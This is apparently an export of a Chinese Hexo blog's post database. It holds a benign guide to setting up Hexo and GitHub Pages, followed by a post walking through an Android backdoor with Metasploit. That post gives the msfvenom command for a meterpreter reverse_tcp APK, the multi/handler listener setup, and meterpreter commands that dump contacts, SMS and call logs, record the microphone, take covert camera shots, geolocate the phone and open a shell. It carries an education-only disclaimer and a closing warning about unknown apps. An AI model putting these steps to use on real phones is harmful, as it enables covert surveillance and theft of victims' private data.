themes/你的主题\n\t  *   git pull\n  * 更新插件：\n\t  *   npm update\n\n###### hexo命令\n\n\n* hexo new \"postName\"       #新建文章\n* hexo new page \"pageName\"  #新建页面\n* hexo generate             #生成静态页面至public目录\n* hexo server               #开启预览访问端口\n* hexo deploy               #将.deploy目录部署到GitHub\n* hexo clean\t\t\t\t#清除缓存\n\n\n","slug":"diary-2016-1215-01","published":1,"updated":"2017-03-28T09:47:15.899Z","photos":[],"link":"","_id":"cjvhjxaai0004iny28rpgkslg","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js.<br> <a id=\"more\"></a></p>\n</blockquote>\n<h1 id=\"一-搭建平台\"><a href=\"#一-搭建平台\" class=\"headerlink\" title=\"一,搭建平台\"></a>一,搭建平台</h1><h6 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境\"></a>配置环境</h6><blockquote>\n<ul>\n<li>安装Node（必须）</li>\n<li>安装Git（必须）</li>\n<li>申请github帐号（必须）</li>\n</ul>\n</blockquote>\n<p>这三个就不用多说了。</p>\n<h6 id=\"配置github\"><a href=\"#配置github\" class=\"headerlink\" title=\"配置github\"></a>配置github</h6><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-0.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>往下拉有个launch automatic page generator</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-1.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>输入标题和内容</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-2.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>完成后选择样式主题</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-3.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果<br><code>https://zhangsan.github.io/</code></p>\n</blockquote>\n<h1 id=\"二-hexo生成博客\"><a href=\"#二-hexo生成博客\" class=\"headerlink\" title=\"二,hexo生成博客\"></a>二,hexo生成博客</h1><h6 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h6><pre><code>* npm install -g hexo\n* npm install hexo-deployer-git --save\n</code></pre><blockquote>\n<p>安装成功后输入命令 <code>hexo init blogname</code> ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了</p>\n</blockquote>\n<h6 id=\"设置主题\"><a href=\"#设置主题\" class=\"headerlink\" title=\"设置主题\"></a>设置主题</h6><blockquote>\n<p>主题: <code>https://hexo.io/themes/</code><br>   找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中</p>\n<pre><code>* git clone https://github.com/iissnan/hexo-theme-next.git themes/next\n</code></pre><p>把hexo主题克隆到博客文件夹中。<br>然后再打开博客主页中的<code>_config.yml</code>，找到<code>theme</code>,后面加上我们主题的名字如theme: next<br>最后运行<code>hexo s</code>可以来查看效果了<br>浏览器输入 <code>http://localhost:4000</code><br>查看效果。</p>\n</blockquote>\n<h1 id=\"三-同步github\"><a href=\"#三-同步github\" class=\"headerlink\" title=\"三,同步github\"></a>三,同步github</h1><h6 id=\"设置ssh-key\"><a href=\"#设置ssh-key\" class=\"headerlink\" title=\"设置ssh key\"></a>设置ssh key</h6><blockquote>\n<p>首先进入到<code>C:\\Users\\username\\.ssh</code>文件夹中，把里面文件都删掉<br>然后输入命令输入<code>bash</code>(配置git环境才有),进入bash shell<br>再来依次输入命令生成ssh</p>\n<pre><code>* ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车)\n* ssh-agent –s\n* ssh-add ~/.ssh/id_rsa\n* eval `ssh-agent -s\n* ssh-add\n</code></pre><p>如果输出了ssh目录呢,就说明生成成功了</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-4.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>进入<code>C:\\Users\\username\\.ssh</code>目录,<code>id_rsa.pub</code>文件就是我们的key。</p>\n</blockquote>\n<h6 id=\"github设置ssh-key\"><a href=\"#github设置ssh-key\" class=\"headerlink\" title=\"github设置ssh key\"></a>github设置ssh key</h6><blockquote>\n<p>打开github的setting<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-5.png\" alt=\"&quot;img&quot;\"><br>下面有一个SSH and GPG keys<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-6.png\" alt=\"&quot;img&quot;\"><br>然后New ssh key，就可以输入标题和key了<br>标题随意，key就是<code>C:\\Users\\username\\.ssh\\id_rsa.pub</code>中的内容，全部复制粘贴过去。<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-7.png\" alt=\"&quot;img&quot;\"><br>Add SSH key 就ok了</p>\n</blockquote>\n<h6 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h6><blockquote>\n<p>在bash shell中输入<code>ssh git@github.com</code></p>\n<p><font color=\"#ff0000\">注意：<br>提示yes or no的话，一定要输入yes，千万别直接回车。</font><br>如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-8.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<h6 id=\"hexo同步到github\"><a href=\"#hexo同步到github\" class=\"headerlink\" title=\"hexo同步到github\"></a>hexo同步到github</h6><blockquote>\n<p>打开blog文件夹中的<code>_config.yml</code>,在最后一行加上</p>\n<pre><code>* deploy: \n* type: git\n* repository: https://github.com/Y00z/y00z.github.io.git\n* branch: master\n</code></pre><p>repository中的地址是上面创建的仓库的地址<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-9.png\" alt=\"&quot;img&quot;\"></p>\n<p><font color=\"#ff0000\">注意:<br>type: 和repository: 以及branch:<br>冒号后面有一个空格。</font><br>最后hexo就可以同步到github上了<br>每次同步到github的命令行</p>\n<ul>\n<li>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br>最后户可以进入your_github_name.github.io 查看效果了。</li>\n</ul>\n</blockquote>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><h6 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h6><ul>\n<li>更新hexo：<ul>\n<li>npm update -g hexo</li>\n</ul>\n</li>\n<li>更新主题：<ul>\n<li>cd themes/你的主题</li>\n<li>git pull</li>\n</ul>\n</li>\n<li>更新插件：<ul>\n<li>npm update</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"hexo命令\"><a href=\"#hexo命令\" class=\"headerlink\" title=\"hexo命令\"></a>hexo命令</h6><ul>\n<li>hexo new “postName”       #新建文章</li>\n<li>hexo new page “pageName”  #新建页面</li>\n<li>hexo generate             #生成静态页面至public目录</li>\n<li>hexo server               #开启预览访问端口</li>\n<li>hexo deploy               #将.deploy目录部署到GitHub</li>\n<li>hexo clean                #清除缓存</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。</p>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js.<br>","more":"</p>\n</blockquote>\n<h1 id=\"一-搭建平台\"><a href=\"#一-搭建平台\" class=\"headerlink\" title=\"一,搭建平台\"></a>一,搭建平台</h1><h6 id=\"配置环境\"><a href=\"#配置环境\" class=\"headerlink\" title=\"配置环境\"></a>配置环境</h6><blockquote>\n<ul>\n<li>安装Node（必须）</li>\n<li>安装Git（必须）</li>\n<li>申请github帐号（必须）</li>\n</ul>\n</blockquote>\n<p>这三个就不用多说了。</p>\n<h6 id=\"配置github\"><a href=\"#配置github\" class=\"headerlink\" title=\"配置github\"></a>配置github</h6><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-0.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>往下拉有个launch automatic page generator</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-1.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>输入标题和内容</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-2.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>完成后选择样式主题</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-3.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果<br><code>https://zhangsan.github.io/</code></p>\n</blockquote>\n<h1 id=\"二-hexo生成博客\"><a href=\"#二-hexo生成博客\" class=\"headerlink\" title=\"二,hexo生成博客\"></a>二,hexo生成博客</h1><h6 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h6><pre><code>* npm install -g hexo\n* npm install hexo-deployer-git --save\n</code></pre><blockquote>\n<p>安装成功后输入命令 <code>hexo init blogname</code> ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了</p>\n</blockquote>\n<h6 id=\"设置主题\"><a href=\"#设置主题\" class=\"headerlink\" title=\"设置主题\"></a>设置主题</h6><blockquote>\n<p>主题: <code>https://hexo.io/themes/</code><br>   找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中</p>\n<pre><code>* git clone https://github.com/iissnan/hexo-theme-next.git themes/next\n</code></pre><p>把hexo主题克隆到博客文件夹中。<br>然后再打开博客主页中的<code>_config.yml</code>，找到<code>theme</code>,后面加上我们主题的名字如theme: next<br>最后运行<code>hexo s</code>可以来查看效果了<br>浏览器输入 <code>http://localhost:4000</code><br>查看效果。</p>\n</blockquote>\n<h1 id=\"三-同步github\"><a href=\"#三-同步github\" class=\"headerlink\" title=\"三,同步github\"></a>三,同步github</h1><h6 id=\"设置ssh-key\"><a href=\"#设置ssh-key\" class=\"headerlink\" title=\"设置ssh key\"></a>设置ssh key</h6><blockquote>\n<p>首先进入到<code>C:\\Users\\username\\.ssh</code>文件夹中，把里面文件都删掉<br>然后输入命令输入<code>bash</code>(配置git环境才有),进入bash shell<br>再来依次输入命令生成ssh</p>\n<pre><code>* ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车)\n* ssh-agent –s\n* ssh-add ~/.ssh/id_rsa\n* eval `ssh-agent -s\n* ssh-add\n</code></pre><p>如果输出了ssh目录呢,就说明生成成功了</p>\n</blockquote>\n<blockquote>\n<p><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-4.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<blockquote>\n<p>进入<code>C:\\Users\\username\\.ssh</code>目录,<code>id_rsa.pub</code>文件就是我们的key。</p>\n</blockquote>\n<h6 id=\"github设置ssh-key\"><a href=\"#github设置ssh-key\" class=\"headerlink\" title=\"github设置ssh key\"></a>github设置ssh key</h6><blockquote>\n<p>打开github的setting<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-5.png\" alt=\"&quot;img&quot;\"><br>下面有一个SSH and GPG keys<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-6.png\" alt=\"&quot;img&quot;\"><br>然后New ssh key，就可以输入标题和key了<br>标题随意，key就是<code>C:\\Users\\username\\.ssh\\id_rsa.pub</code>中的内容，全部复制粘贴过去。<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-7.png\" alt=\"&quot;img&quot;\"><br>Add SSH key 就ok了</p>\n</blockquote>\n<h6 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h6><blockquote>\n<p>在bash shell中输入<code>ssh git@github.com</code></p>\n<p><font color=\"#ff0000\">注意：<br>提示yes or no的话，一定要输入yes，千万别直接回车。</font><br>如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-8.png\" alt=\"&quot;img&quot;\"></p>\n</blockquote>\n<h6 id=\"hexo同步到github\"><a href=\"#hexo同步到github\" class=\"headerlink\" title=\"hexo同步到github\"></a>hexo同步到github</h6><blockquote>\n<p>打开blog文件夹中的<code>_config.yml</code>,在最后一行加上</p>\n<pre><code>* deploy: \n* type: git\n* repository: https://github.com/Y00z/y00z.github.io.git\n* branch: master\n</code></pre><p>repository中的地址是上面创建的仓库的地址<br><img src=\"http://oi6ni1o6u.bkt.clouddn.com/pasted-9.png\" alt=\"&quot;img&quot;\"></p>\n<p><font color=\"#ff0000\">注意:<br>type: 和repository: 以及branch:<br>冒号后面有一个空格。</font><br>最后hexo就可以同步到github上了<br>每次同步到github的命令行</p>\n<ul>\n<li>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d<br>最后户可以进入your_github_name.github.io 查看效果了。</li>\n</ul>\n</blockquote>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><h6 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h6><ul>\n<li>更新hexo：<ul>\n<li>npm update -g hexo</li>\n</ul>\n</li>\n<li>更新主题：<ul>\n<li>cd themes/你的主题</li>\n<li>git pull</li>\n</ul>\n</li>\n<li>更新插件：<ul>\n<li>npm update</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"hexo命令\"><a href=\"#hexo命令\" class=\"headerlink\" title=\"hexo命令\"></a>hexo命令</h6><ul>\n<li>hexo new “postName”       #新建文章</li>\n<li>hexo new page “pageName”  #新建页面</li>\n<li>hexo generate             #生成静态页面至public目录</li>\n<li>hexo server               #开启预览访问端口</li>\n<li>hexo deploy               #将.deploy目录部署到GitHub</li>\n<li>hexo clean                #清除缓存</li>\n</ul>"},{"layout":"post","title":"msf渗透android并植入后门","date":"2016-12-19T07:32:08.000Z","comments":1,"_content":"## 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n## 正文\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <!--more-->。团队合作，在Metasploit和综合报告提出了他们的发现。\n\n### 环境\n> * BackBox、kali linux、或者BackTrack(kali linux的前身)\n> * 一台安卓设备\n\n\n> 环境不说太多介绍了，直接来实战。\n### 生成payload\n> 装好环境后查看自己的ip\n![](/images/pasted-10.png)\n\n> 生成一个payload\n>\t\n\tmsfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R > /root/apk.apk\n>* p 设置要使用的payload\n>* LHOST 设置用来接收反弹连接的主机\n>* LPORT 设置用来接收反弹连接的端口\n\n![](/images/pasted-11.png)\n\n>很小，才8kb\n>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。\n>生成的apk放到手机上安装，安装完成后是这样的。\n>![](/images/pasted-12.png)\n\n### 反弹shell\n>启动msf\n>![](/images/pasted-13.png)\n>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)\n\t* use exploit/multi/handler\n\t* set payload android/meterpreter/reverse_tcp\n\t* set LHOST 192.168.0.18 \n\t* set LPORT 2333\n>![](/images/pasted-14.png)\n> 设置完毕后就可以输入 `exploit` 来执行攻击了\n>![](/images/pasted-15.png)\n\n>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线\n>然后我打开我们刚刚安装的\n>打开后会连接到msf\n>![](/images/pasted-16.png)\n>![](/images/pasted-17.png)\n>这样我们就拿到了手机的shell\n\n### 控制指令\n>我来介绍几个有意思的指令。\n\t* check_root\t#查看是否root\n\t* dump_calllog\t#下载通讯记录\n\t* dump_contacts\t#下载联系人\n\t* dump_sms\t\t#下载短信\n\t* send_sms\t\t#发送短信\n\t* record_mic\t#录音\n\t* webcam_list\t#查看手机摄像头\n\t* webcam_snap\t#拍照\n\t* webcam_stream\t#连续拍照\n\t* geolocate\t\t#获取目标地理位置\n\t* upload\t\t#上传文件到手机\n\t* download\t\t#下载手机上的文件\n\t* shell\t\t\t#进入手机的bash shell\n\n##### check_root(检测root)\n>![](/images/pasted-18.png)\n>是root的设备\n\n##### dump_contacts(下载联系人)\n>![](/images/pasted-19.png)\n>57个联系人\n>![](/images/pasted-20.png)\n\n##### dump_sms(下载短信)\n>![](/images/pasted-21.png)\n>1271条短信\n>![](/images/pasted-22.png)\n\n##### send_sms(发送短信)\n> * -d目标电话号码\n> * -t 短信内容\n>![](/images/pasted-23.png)\n>![](/images/pasted-24.png)\n\n##### record_mic(录音)\n> * -d 录音的秒数\n> 音频文件会自动保存在/var/www/html/目录下\n>![](/images/pasted-25.png)\n\n##### webcam_list(检测摄像头)\n>![](/images/pasted-26.png)\n>2:前置摄像头\n>1:后置摄像头\n\n##### webcam_snap(拍照)\n> * -i 选择使用哪个摄像头拍照\n>手机息屏的时候也可以拍照\n>![](/images/pasted-27.png)\n\n##### webcam_stream(连续拍照)\n> * -i 指定摄像头\n> * -d 拍照间隔(默认1800毫秒)\n> 使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片\n>![](/images/pasted-28.png)\n\n##### geolocate(获取地理位置)\n>![](/images/pasted-29.png)\n\n##### upload(上传文件到手机)\n>![](/images/pasted-30.png)\n\n##### download(下载文件到手机)\n>![](/images/pasted-31.png)\n\n##### shell(进入手机bash shell)\n>![](/images/pasted-32.png)\n\n### 最后\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","source":"_posts/diary-2016-1219-01.md","raw":"---\nlayout: post\ntitle: msf渗透android并植入后门\ndate: 2016-12-19 15:32:08\ncomments: true\ntags:\n\t- 安卓\n\t- 安全攻防\n---\n## 前言\n><font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>\n\n## 正文\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <!--more-->。团队合作，在Metasploit和综合报告提出了他们的发现。\n\n### 环境\n> * BackBox、kali linux、或者BackTrack(kali linux的前身)\n> * 一台安卓设备\n\n\n> 环境不说太多介绍了，直接来实战。\n### 生成payload\n> 装好环境后查看自己的ip\n![](/images/pasted-10.png)\n\n> 生成一个payload\n>\t\n\tmsfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R > /root/apk.apk\n>* p 设置要使用的payload\n>* LHOST 设置用来接收反弹连接的主机\n>* LPORT 设置用来接收反弹连接的端口\n\n![](/images/pasted-11.png)\n\n>很小，才8kb\n>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。\n>生成的apk放到手机上安装，安装完成后是这样的。\n>![](/images/pasted-12.png)\n\n### 反弹shell\n>启动msf\n>![](/images/pasted-13.png)\n>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)\n\t* use exploit/multi/handler\n\t* set payload android/meterpreter/reverse_tcp\n\t* set LHOST 192.168.0.18 \n\t* set LPORT 2333\n>![](/images/pasted-14.png)\n> 设置完毕后就可以输入 `exploit` 来执行攻击了\n>![](/images/pasted-15.png)\n\n>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线\n>然后我打开我们刚刚安装的\n>打开后会连接到msf\n>![](/images/pasted-16.png)\n>![](/images/pasted-17.png)\n>这样我们就拿到了手机的shell\n\n### 控制指令\n>我来介绍几个有意思的指令。\n\t* check_root\t#查看是否root\n\t* dump_calllog\t#下载通讯记录\n\t* dump_contacts\t#下载联系人\n\t* dump_sms\t\t#下载短信\n\t* send_sms\t\t#发送短信\n\t* record_mic\t#录音\n\t* webcam_list\t#查看手机摄像头\n\t* webcam_snap\t#拍照\n\t* webcam_stream\t#连续拍照\n\t* geolocate\t\t#获取目标地理位置\n\t* upload\t\t#上传文件到手机\n\t* download\t\t#下载手机上的文件\n\t* shell\t\t\t#进入手机的bash shell\n\n##### check_root(检测root)\n>![](/images/pasted-18.png)\n>是root的设备\n\n##### dump_contacts(下载联系人)\n>![](/images/pasted-19.png)\n>57个联系人\n>![](/images/pasted-20.png)\n\n##### dump_sms(下载短信)\n>![](/images/pasted-21.png)\n>1271条短信\n>![](/images/pasted-22.png)\n\n##### send_sms(发送短信)\n> * -d目标电话号码\n> * -t 短信内容\n>![](/images/pasted-23.png)\n>![](/images/pasted-24.png)\n\n##### record_mic(录音)\n> * -d 录音的秒数\n> 音频文件会自动保存在/var/www/html/目录下\n>![](/images/pasted-25.png)\n\n##### webcam_list(检测摄像头)\n>![](/images/pasted-26.png)\n>2:前置摄像头\n>1:后置摄像头\n\n##### webcam_snap(拍照)\n> * -i 选择使用哪个摄像头拍照\n>手机息屏的时候也可以拍照\n>![](/images/pasted-27.png)\n\n##### webcam_stream(连续拍照)\n> * -i 指定摄像头\n> * -d 拍照间隔(默认1800毫秒)\n> 使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片\n>![](/images/pasted-28.png)\n\n##### geolocate(获取地理位置)\n>![](/images/pasted-29.png)\n\n##### upload(上传文件到手机)\n>![](/images/pasted-30.png)\n\n##### download(下载文件到手机)\n>![](/images/pasted-31.png)\n\n##### shell(进入手机bash shell)\n>![](/images/pasted-32.png)\n\n### 最后\n> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","slug":"diary-2016-1219-01","published":1,"updated":"2017-07-13T11:06:56.369Z","photos":[],"link":"","_id":"cjvhjxaai0005iny2be8y93tc","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<font color=\"#ff0000\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>\n</blockquote>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><blockquote>\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <a id=\"more\"></a>。团队合作，在Metasploit和综合报告提出了他们的发现。</p>\n</blockquote>\n<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><blockquote>\n<ul>\n<li>BackBox、kali linux、或者BackTrack(kali linux的前身)</li>\n<li>一台安卓设备</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>环境不说太多介绍了，直接来实战。</p>\n</blockquote>\n<h3 id=\"生成payload\"><a href=\"#生成payload\" class=\"headerlink\" title=\"生成payload\"></a>生成payload</h3><blockquote>\n<p>装好环境后查看自己的ip<br><img src=\"/images/pasted-10.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>生成一个payload</p>\n<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk\n</code></pre><ul>\n<li>p 设置要使用的payload</li>\n<li>LHOST 设置用来接收反弹连接的主机</li>\n<li>LPORT 设置用来接收反弹连接的端口</li>\n</ul>\n</blockquote>\n<p><img src=\"/images/pasted-11.png\" alt></p>\n<blockquote>\n<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src=\"/images/pasted-12.png\" alt></p>\n</blockquote>\n<h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><blockquote>\n<p>启动msf<br><img src=\"/images/pasted-13.png\" alt><br>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)</p>\n<pre><code>* use exploit/multi/handler\n* set payload android/meterpreter/reverse_tcp\n* set LHOST 192.168.0.18 \n* set LPORT 2333\n</code></pre><p><img src=\"/images/pasted-14.png\" alt><br>设置完毕后就可以输入 <code>exploit</code> 来执行攻击了<br><img src=\"/images/pasted-15.png\" alt></p>\n</blockquote>\n<blockquote>\n<p>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线<br>然后我打开我们刚刚安装的<br>打开后会连接到msf<br><img src=\"/images/pasted-16.png\" alt><br><img src=\"/images/pasted-17.png\" alt><br>这样我们就拿到了手机的shell</p>\n</blockquote>\n<h3 id=\"控制指令\"><a href=\"#控制指令\" class=\"headerlink\" title=\"控制指令\"></a>控制指令</h3><blockquote>\n<p>我来介绍几个有意思的指令。</p>\n<pre><code>* check_root    #查看是否root\n* dump_calllog    #下载通讯记录\n* dump_contacts    #下载联系人\n* dump_sms        #下载短信\n* send_sms        #发送短信\n* record_mic    #录音\n* webcam_list    #查看手机摄像头\n* webcam_snap    #拍照\n* webcam_stream    #连续拍照\n* geolocate        #获取目标地理位置\n* upload        #上传文件到手机\n* download        #下载手机上的文件\n* shell            #进入手机的bash shell\n</code></pre></blockquote>\n<h5 id=\"check-root-检测root\"><a href=\"#check-root-检测root\" class=\"headerlink\" title=\"check_root(检测root)\"></a>check_root(检测root)</h5><blockquote>\n<p><img src=\"/images/pasted-18.png\" alt><br>是root的设备</p>\n</blockquote>\n<h5 id=\"dump-contacts-下载联系人\"><a href=\"#dump-contacts-下载联系人\" class=\"headerlink\" title=\"dump_contacts(下载联系人)\"></a>dump_contacts(下载联系人)</h5><blockquote>\n<p><img src=\"/images/pasted-19.png\" alt><br>57个联系人<br><img src=\"/images/pasted-20.png\" alt></p>\n</blockquote>\n<h5 id=\"dump-sms-下载短信\"><a href=\"#dump-sms-下载短信\" class=\"headerlink\" title=\"dump_sms(下载短信)\"></a>dump_sms(下载短信)</h5><blockquote>\n<p><img src=\"/images/pasted-21.png\" alt><br>1271条短信<br><img src=\"/images/pasted-22.png\" alt></p>\n</blockquote>\n<h5 id=\"send-sms-发送短信\"><a href=\"#send-sms-发送短信\" class=\"headerlink\" title=\"send_sms(发送短信)\"></a>send_sms(发送短信)</h5><blockquote>\n<ul>\n<li>-d目标电话号码</li>\n<li>-t 短信内容<br><img src=\"/images/pasted-23.png\" alt><br><img src=\"/images/pasted-24.png\" alt></li>\n</ul>\n</blockquote>\n<h5 id=\"record-mic-录音\"><a href=\"#record-mic-录音\" class=\"headerlink\" title=\"record_mic(录音)\"></a>record_mic(录音)</h5><blockquote>\n<ul>\n<li>-d 录音的秒数<br>音频文件会自动保存在/var/www/html/目录下<br><img src=\"/images/pasted-25.png\" alt></li>\n</ul>\n</blockquote>\n<h5 